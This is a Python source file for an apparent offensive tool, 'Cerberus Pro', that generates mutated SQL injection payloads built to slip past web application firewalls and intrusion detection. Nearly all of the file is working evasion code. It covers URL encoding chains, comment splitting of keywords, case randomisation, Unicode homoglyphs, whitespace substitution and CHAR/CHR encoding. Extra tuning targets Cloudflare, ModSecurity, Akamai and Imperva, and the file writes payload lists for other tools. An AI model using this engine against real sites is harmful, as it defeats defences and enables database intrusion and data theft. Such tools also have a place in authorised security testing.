"""
Cerberus Pro - Polymorphic Payload Mutation Engine
Generates dynamically mutated SQLi payloads to bypass WAFs and IDS/IPS.
"""

import base64
import random
import string
import urllib.parse
import tempfile
import os
from typing import Dict, List, Optional


# Unicode homoglyphs for common SQL characters
_HOMOGLYPHS = {
    "a": ["а", "ɑ", "α"],   # Cyrillic а, Latin ɑ, Greek α
    "e": ["е", "ɛ", "ε"],   # Cyrillic е
    "o": ["о", "ο", "ᴏ"],   # Cyrillic о, Greek ο
    "i": ["і", "ι", "ɪ"],   # Cyrillic і, Greek ι
    "s": ["ѕ", "ꜱ"],        # Cyrillic ѕ
    "c": ["с", "ϲ"],        # Cyrillic с, Greek ϲ
    "p": ["р", "ρ"],        # Cyrillic р, Greek ρ
    "'": ["ʼ", "ˈ", "ʻ"],   # Modifier letter variants
    " ": ["\t", "\n", "\x0b", "\x0c", "\r"],
}

# SQL keywords for comment injection
_SQL_KEYWORDS = [
    "SELECT", "FROM", "WHERE", "UNION", "AND", "OR", "INSERT",
    "UPDATE", "DELETE", "DROP", "ORDER", "GROUP", "BY", "HAVING",
    "NULL", "INTO", "VALUES", "SET", "LIKE", "BETWEEN", "IN",
    "JOIN", "LEFT", "RIGHT", "INNER", "OUTER", "ON", "AS",
    "LIMIT", "OFFSET", "CASE", "WHEN", "THEN", "ELSE", "END",
]


class PayloadMutationEngine:
    """Generates dynamically mutated SQLi payloads to bypass WAF/IDS."""

    MUTATION_TECHNIQUES = [
        "encoding_chain",
        "comment_injection",
        "case_randomization",
        "unicode_homoglyphs",
        "whitespace_variation",
        "concatenation",
        "char_encoding",
    ]

    # DBMS-specific patterns
    DBMS_CONCAT = {
        "mysql": "CONCAT({parts})",
        "postgresql": "{parts_pipe}",  # 'a'||'b'
        "mssql": "{parts_plus}",       # 'a'+'b'
        "oracle": "{parts_pipe}",      # 'a'||'b'
        "sqlite": "{parts_pipe}",
    }

    DBMS_CHAR_FN = {
        "mysql": "CHAR({codes})",
        "postgresql": "CHR({code})",
        "mssql": "CHAR({codes})",
        "oracle": "CHR({code})",
        "sqlite": "CHAR({codes})",
    }

    @staticmethod
    def _encoding_chain(payload: str) -> str:
        """Apply layered encoding: URL encode then optionally base64."""
        # Layer 1: URL encode special chars
        encoded = urllib.parse.quote(payload, safe="")
        # Layer 2: Optionally double-encode (50% chance)
        if random.random() > 0.5:
            encoded = urllib.parse.quote(encoded, safe="")
        return encoded

    @staticmethod
    def _comment_injection(payload: str) -> str:
        """Insert random inline comments within SQL keywords."""
        result = payload
        for kw in _SQL_KEYWORDS:
            if kw.upper() in result.upper():
                # Find the keyword case-insensitively and inject comment
                idx = result.upper().find(kw.upper())
                if idx >= 0:
                    original = result[idx:idx + len(kw)]
                    if len(original) > 2:
                        split_pos = random.randint(1, len(original) - 1)
                        commented = original[:split_pos] + "/**/" + original[split_pos:]
                        result = result[:idx] + commented + result[idx + len(kw):]
        return result

    @staticmethod
    def _case_randomization(payload: str) -> str:
        """Randomize case of each character."""
        return "".join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )

    @staticmethod
    def _unicode_homoglyphs(payload: str) -> str:
        """Replace some characters with visually similar Unicode alternatives."""
        result = list(payload)
        for i, c in enumerate(result):
            if c.lower() in _HOMOGLYPHS and random.random() > 0.7:
                result[i] = random.choice(_HOMOGLYPHS[c.lower()])
        return "".join(result)

    @staticmethod
    def _whitespace_variation(payload: str) -> str:
        """Replace spaces with alternative whitespace characters."""
        alternatives = [
            "\t",           # Tab
            "\n",           # Newline
            "%09",          # URL-encoded tab
            "%0a",          # URL-encoded newline
            "%0d",          # URL-encoded CR
            "/**/",         # SQL comment as space
            "%20",          # URL-encoded space
            "+",            # Plus sign
        ]
        result = []
        for c in payload:
            if c == " " and random.random() > 0.4:
                result.append(random.choice(alternatives))
            else:
                result.append(c)
        return "".join(result)

    @staticmethod
    def _concatenation(payload: str, dbms: str = "mysql") -> str:
        """Break string literals into concatenated parts."""
        # Find string literals (single-quoted)
        result = payload
        parts = []
        in_string = False
        current = []

        for c in payload:
            if c == "'" and not in_string:
                in_string = True
                current = []
            elif c == "'" and in_string:
                in_string = False
                s = "".join(current)
                if len(s) > 2:
                    # Split into chunks
                    chunks = []
                    while s:
                        chunk_size = random.randint(1, max(1, len(s) // 2))
                        chunks.append(s[:chunk_size])
                        s = s[chunk_size:]
                    if dbms in ("mysql",):
                        concat_expr = "CONCAT(" + ",".join(f"'{c}'" for c in chunks) + ")"
                    elif dbms in ("mssql",):
                        concat_expr = "+".join(f"'{c}'" for c in chunks)
                    else:
                        concat_expr = "||".join(f"'{c}'" for c in chunks)
                    result = result.replace(f"'{''.join(chunks)}'", concat_expr, 1)
            elif in_string:
                current.append(c)

        return result

    @staticmethod
    def _char_encoding(payload: str, dbms: str = "mysql") -> str:
        """Encode string literals as CHAR() / CHR() function calls."""
        result = payload
        in_string = False
        current = []

        for i, c in enumerate(payload):
            if c == "'" and not in_string:
                in_string = True
                current = []
            elif c == "'" and in_string:
                in_string = False
                s = "".join(current)
                if len(s) >= 1:
                    codes = [str(ord(ch)) for ch in s]
                    if dbms in ("mysql", "mssql", "sqlite"):
                        char_expr = "CHAR(" + ",".join(codes) + ")"
                    else:
                        # PostgreSQL/Oracle use CHR per char, concatenated
                        char_expr = "||".join(f"CHR({c})" for c in codes)
                    result = result.replace(f"'{s}'", char_expr, 1)
            elif in_string:
                current.append(c)

        return result

    @classmethod
    def mutate(
        cls,
        base_payload: str,
        techniques: Optional[List[str]] = None,
        count: int = 10,
        dbms: str = "mysql",
    ) -> List[str]:
        """
        Generate N unique mutated variants of the base payload.

        Args:
            base_payload: Original SQLi payload (e.g., "1' OR '1'='1")
            techniques: Mutation techniques to use (None = all)
            count: Number of unique variants to generate
            dbms: Target DBMS for context-aware mutations

        Returns:
            List of unique mutated payloads
        """
        available = techniques or cls.MUTATION_TECHNIQUES
        mutations = set()
        max_attempts = count * 5  # Avoid infinite loop

        for _ in range(max_attempts):
            if len(mutations) >= count:
                break

            technique = random.choice(available)
            mutated = base_payload

            if technique == "encoding_chain":
                mutated = cls._encoding_chain(mutated)
            elif technique == "comment_injection":
                mutated = cls._comment_injection(mutated)
            elif technique == "case_randomization":
                mutated = cls._case_randomization(mutated)
            elif technique == "unicode_homoglyphs":
                mutated = cls._unicode_homoglyphs(mutated)
            elif technique == "whitespace_variation":
                mutated = cls._whitespace_variation(mutated)
            elif technique == "concatenation":
                mutated = cls._concatenation(mutated, dbms=dbms)
            elif technique == "char_encoding":
                mutated = cls._char_encoding(mutated, dbms=dbms)

            if mutated != base_payload:
                mutations.add(mutated)

        return list(mutations)[:count]

    @classmethod
    def generate_payload_file(
        cls,
        base_payloads: List[str],
        context: Optional[Dict[str, str]] = None,
        count_per_payload: int = 10,
    ) -> str:
        """
        Generate a temporary UTF-8 payload file for other tools/components.

        Important (Windows):
        - Payloads can include Unicode homoglyphs by design.
        - Always write as UTF-8 to avoid cp1252 decode issues.
        """
        all_lines: List[str] = []
        for p in base_payloads:
            variants = cls.context_aware_mutation(
                p,
                context=context or {},
                count=max(1, int(count_per_payload)),
            )
            all_lines.extend(variants)

        # Deduplicate while keeping order
        seen = set()
        unique_lines: List[str] = []
        for l in all_lines:
            if l not in seen:
                unique_lines.append(l)
                seen.add(l)

        fd, path = tempfile.mkstemp(prefix="cerberus_payloads_", suffix=".txt")
        try:
            with os.fdopen(fd, "w", encoding="utf-8", newline="\n") as f:
                for line in unique_lines:
                    if not line:
                        continue
                    f.write(line)
                    f.write("\n")
        except Exception:
            try:
                os.unlink(path)
            except Exception:
                pass
            raise
        return path

    @classmethod
    def context_aware_mutation(
        cls,
        base_payload: str,
        context: Dict[str, str],
        count: int = 10,
    ) -> List[str]:
        """
        Generate payloads adapted to target context.

        Context keys:
            dbms: mysql, postgresql, mssql, oracle, sqlite
            waf: cloudflare, akamai, modsecurity, imperva
            injection_point: parameter, header, cookie, json
        """
        dbms = context.get("dbms", "mysql").lower()
        waf = context.get("waf", "").lower()
        injection_point = context.get("injection_point", "parameter").lower()

        # Select best techniques for context
        techniques = list(cls.MUTATION_TECHNIQUES)

        # WAF-specific emphasis
        if "cloudflare" in waf:
            techniques.extend(["encoding_chain", "case_randomization", "comment_injection"] * 2)
        elif "modsecurity" in waf:
            techniques.extend(["unicode_homoglyphs", "whitespace_variation", "char_encoding"] * 2)
        elif "akamai" in waf or "imperva" in waf:
            techniques.extend(["encoding_chain", "concatenation", "char_encoding"] * 2)

        # Injection point tuning
        if injection_point == "header":
            # Avoid URL encoding for headers
            techniques = [t for t in techniques if t != "encoding_chain"]
        elif injection_point == "json":
            # JSON can handle unicode well
            techniques.extend(["unicode_homoglyphs"] * 3)

        return cls.mutate(
            base_payload,
            techniques=techniques,
            count=count,
            dbms=dbms,
        )

